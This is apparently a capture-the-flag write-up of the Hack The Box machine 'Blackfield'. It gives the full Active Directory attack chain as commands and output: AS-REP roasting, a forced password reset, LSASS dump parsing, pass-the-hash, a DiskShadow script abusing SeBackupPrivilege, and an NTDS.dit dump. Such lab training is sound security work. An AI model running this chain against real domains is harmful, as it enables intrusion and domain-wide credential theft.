---
title: "HTB Blackfield"
date: 2026-05-20 16:25 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Hard]
image: /assets/img/posts/blackfield/blackfield.png
---

**HTB Blackfield** is a Windows `Active Directory` machine that starts with enumerating a readable `profiles$` `SMB` share to harvest usernames, performing `AS-REP Roasting` to crack credentials for `support`, using `BloodHound` to identify a `ForceChangePassword` path to `audit2020`, accessing a `forensic` share containing an `LSASS` memory dump, extracting `svc_backup`'s `NTLM` hash with `pypykatz`, and escalating to `Administrator` by abusing `SeBackupPrivilege` with `DiskShadow` to shadow copy the `C:` drive and extract `NTDS.dit` for a full domain credential dump.

## Reconnaissance

### Scanning

- Nmap (All ports)

```
nmap -p- 10.129.40.198 --min-rate 1000 -nv
```
```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman
```

- NSE Scripts & Version

```
nmap -sCV -p53,88,135,389,445,593,3268,5985 10.129.40.198 --min-rate 1000 -nv
```
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-20 22:41:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m46s
| smb2-time: 
|   date: 2026-05-20T22:41:42
|_  start_date: N/A
```

### Configuration

- /etc/hosts

```bash
sudo nxc smb 10.129.40.198 --generate-hosts-file /etc/hosts
```

- /etc/krb5.conf

```bash
sudo nxc smb DC01.BLACKFIELD.local --generate-krb5-file /etc/krb5.conf
```

- time

```bash
sudo ntpdate -u DC01.BLACKFIELD.local
```

### SMB

```
➜  Blackfield nxc smb DC01.BLACKFIELD.local -u 'guest' -p '' --shares
SMB         10.129.40.198   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.40.198   445    DC01             [+] BLACKFIELD.local\guest: 
SMB         10.129.40.198   445    DC01             [*] Enumerated shares
SMB         10.129.40.198   445    DC01             Share           Permissions     Remark
SMB         10.129.40.198   445    DC01             -----           -----------     ------
SMB         10.129.40.198   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.40.198   445    DC01             C$                              Default share
SMB         10.129.40.198   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.40.198   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.40.198   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.40.198   445    DC01             profiles$       READ            
SMB         10.129.40.198   445    DC01             SYSVOL                          Logon server share
```

### mount

```
sudo mount -t cifs '//10.129.40.198/profiles$' /mnt
```
```
ls /mnt > users.lst
```

### kerbrute

```
./kerbrute userenum -d BLACKFIELD.LOCAL --dc 10.129.40.198 -o kerbrute_userenum.out users.lst
```

```
impacket-GetNPUsers blackfield.local/ -dc-ip 10.129.40.198 -usersfile users.txt -no-pass -request
```

```
support:#00^BlackKnight
```

## BloodHound

```
bloodhound-python -c All -u 'support' -p '#00^BlackKnight' -ns 10.129.40.198 -d BLACKFIELD.local -dc BLACKFIELD.local --zip
```

![support](/assets/img/posts/blackfield/support.png)

```
bloodyAD -u 'support' -p '#00^BlackKnight' -d BLACKFIELD.local --host 10.129.40.198 set password audit2020 'NewP@ssword2026'
```

### Forensic Share

```
➜  Blackfield nxc smb DC01.BLACKFIELD.local -u 'audit2020' -p 'NewP@ssword2026' --shares
SMB         10.129.40.198   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.40.198   445    DC01             [+] BLACKFIELD.local\audit2020:NewP@ssword2026 
SMB         10.129.40.198   445    DC01             [*] Enumerated shares
SMB         10.129.40.198   445    DC01             Share           Permissions     Remark
SMB         10.129.40.198   445    DC01             -----           -----------     ------
SMB         10.129.40.198   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.40.198   445    DC01             C$                              Default share
SMB         10.129.40.198   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.40.198   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.40.198   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.40.198   445    DC01             profiles$       READ            
SMB         10.129.40.198   445    DC01             SYSVOL          READ            Logon server share
```

```
sudo mount -t cifs //10.129.40.198/forensic /mnt -o username=audit2020,password='NewP@ssword2026',vers=3.0
```

```
/mnt ls /mnt/memory_analysis 
conhost.zip  dfsrs.zip    ismserv.zip  mmc.zip            ServerManager.zip  smartscreen.zip  taskhostw.zip  wlms.zip
ctfmon.zip   dllhost.zip  lsass.zip    RuntimeBroker.zip  sihost.zip         svchost.zip      winlogon.zip   WmiPrvSE.zip
```

```
pypykatz lsa minidump lsass.DMP
```

```
➜  Blackfield nxc smb DC01.BLACKFIELD.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.129.40.198   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.40.198   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
➜  Blackfield nxc winrm DC01.BLACKFIELD.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
WINRM       10.129.40.198   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local) 
WINRM       10.129.40.198   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

## shell as svc_backup

```
evil-winrm -i DC01.BLACKFIELD.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```
cat > /tmp/diskshadow.txt << 'EOF'
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent nowriters
begin backup
add volume C: alias hoxon
create
expose %hoxon% z:
end backup
EOF
```

```
unix2dos /tmp/diskshadow.txt
```

- [GithubRepo](https://github.com/giuliano108/SeBackupPrivilege)

```
*Evil-WinRM* PS C:\Users\svc_backup> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup> import-module .\SeBackupPrivilegeUtils.dll
```

### secretsdump

```
impacket-secretsdump -ntds ntds.dit -system system.bak -security SECURITY LOCAL
```

```
nxc smb DC01.BLACKFIELD.local -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee' -x 'type C:\Users\Administrator\Desktop\root.txt'
```

